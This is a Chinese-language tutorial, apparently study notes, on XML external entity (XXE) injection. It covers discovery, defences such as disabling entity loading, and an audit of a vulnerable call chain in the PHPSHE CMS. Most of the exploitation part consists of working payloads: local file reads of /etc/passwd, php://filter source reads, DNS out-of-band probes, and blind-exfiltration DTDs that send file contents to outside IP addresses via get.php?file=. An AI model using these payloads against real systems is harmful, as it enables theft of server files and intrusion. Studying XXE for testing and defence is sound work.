
---

➢ XML&XXE-传输-原理&探针&利用&玩法

➢ XML&XXE-黑盒-JS&黑盒测试&类型修改

➢ XML&XXE-白盒-CMS&PHPSHE&无回显

一、详细点：

XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。等同于JSON传输。XXE漏洞XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网扫描、攻击内网等危害。

-XML 与 HTML 的主要差异：

XML 被设计为传输和存储数据，其焦点是数据的内容。

HTML 被设计用来显示数据，其焦点是数据的外观。

HTML 旨在显示信息 ，而XML旨在传输存储信息。

Example：网站的xml文件解析

（1）-XXE黑盒发现：

```
1、获取得到Content-Type或数据类型为xml时，尝试xml语言payload进行测试

2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe

3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行
```

（2）-XXE白盒发现：

```
1、可通过应用功能追踪代码定位审计

2、可通过脚本特定函数搜索定位审计

3、可通过伪协议玩法绕过相关修复等
```

二、XXE修复防御方案：

（1）-方案1-禁用外部实体

```php
PHP:
libxml_disable_entity_loader(true);
```

```java
JAVA:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);
```

```python
Python：
from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

（2）-方案2-过滤用户提交的XML数据

过滤关键词：
```
<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC
```


三、利用
-XML&XXE-传输-原理&探针&利用&玩法

1、读取文件：

```xml
<?xml version="1.0"?>

<!DOCTYPE xiaodi [

<!ENTITY test SYSTEM "file:///d:/1.txt">

]>

<user><username>&test;</username><password>xiaodi</password></user>

```
读取php文件 
```
php://filter/read=convert.base64-encode/resource=msg.php
```

1.1、带外测试：

```xml
<?xml version="1.0" ?>

<!DOCTYPE test [

<!ENTITY % file SYSTEM "http://9v57ll.dnslog.cn">

%file;

]>

<user><username>&send;</username><password>xiaodi</password></user>
```

2、外部引用实体dtd：

```xml
<?xml version="1.0" ?>

<!DOCTYPE test [

<!ENTITY % file SYSTEM "http://127.0.0.1:8081/xiaodi.dtd">

%file;

]>

<user><username>&send;</username><password>xiaodi</password></user>
```

xiaodi.dtd
```dtd

<!ENTITY send SYSTEM "file:///d:/1.txt">
```

3、无回显读文件

```dtd
<?xml version="1.0" encoding="UTF-8"?>
1、
<!DOCTYPE updateProfile [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php">
    <!ENTITY % dtd SYSTEM "http://124.71.115.19/hzh.dtd">
    %dtd;
    %send;
]>



2、
<!DOCTYPE hacker[
    <!ENTITY  % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">

    <!ENTITY  % myurl SYSTEM "http://124.71.115.19/hzh.dtd">
    %myurl;
]> 

```
test.dtd
接收可以写一个php接收，也可以用nc监听

接收的base64带有空格，需要去掉在进行解码
```dtd
1、
<!ENTITY % all
    "<!ENTITY &#x25; send SYSTEM 'http://124.71.115.19/get.php?file=%file;'>"
>
%all;


2、
<!ENTITY % dtd "<!ENTITY &#x25; vps SYSTEM 'http://124.71.115.19/get.php?file=%file;'> ">
<!-- &#x25; 就是百分号（&#x25; vps=% vps），因为是嵌套在里面的引用，不能直接写百分号 -->
<!-- 如果选择nc监听的话，端口一定要加！！！ -->
<!-- 如果选择看日志的话，端口一定不能加！！！ -->

<!-- 引用（执行）dtd实体，vps被注册 -->
%dtd;
<!-- 引用（执行）vps实体，接收%file变量的内容 -->
%vps;

```



4、其他玩法（协议）-见参考地址

https://www.cnblogs.com/20175211lyz/p/11413335.html

#XML&XXE-黑盒-JS&黑盒测试&类型修改#http://web.jarvisoj.com:9882/

XXE黑盒发现：

1、获取Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试

2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe

流程：功能分析-前端提交-源码&抓包-构造Paylod测试

更改请求数据格式：Content-Type

```xml
<?xml version = "1.0"?>

<!DOCTYPE ANY [

<!ENTITY f SYSTEM "file:///etc/passwd">

]>

<x>&f;</x>
```

#XML&XXE-白盒-CMS&PHPSHE&无回显

审计流程：

1、漏洞函数simplexml_load_string

2、pe_getxml函数调用了漏洞函数

3、wechat_getxml调用了pe_getxml

4、notify_url调用了wechat_getxml

访问notify_url文件触发wechat_getxml函数,构造Paylod测试

先尝试读取文件，无回显后带外测试：

```xml
<?xml version="1.0" ?>

<!DOCTYPE test [

<!ENTITY % file SYSTEM "http://1uwlwv.dnslog.cn">

%file;

]>

<root>&send;</root>
```

然后带外传递数据解决无回显：

```xml
<?xml version="1.0"?>

<!DOCTYPE ANY[

<!ENTITY % file SYSTEM "file:///d:/1.txt">

<!ENTITY % remote SYSTEM "http://47.94.236.117/test.dtd">

%remote;

%all;

]>

<root>&send;</root>

test.dtd：

<!ENTITY % all "<!ENTITY send SYSTEM 'http://47.94.236.117/get.php?file=%file;'>">
```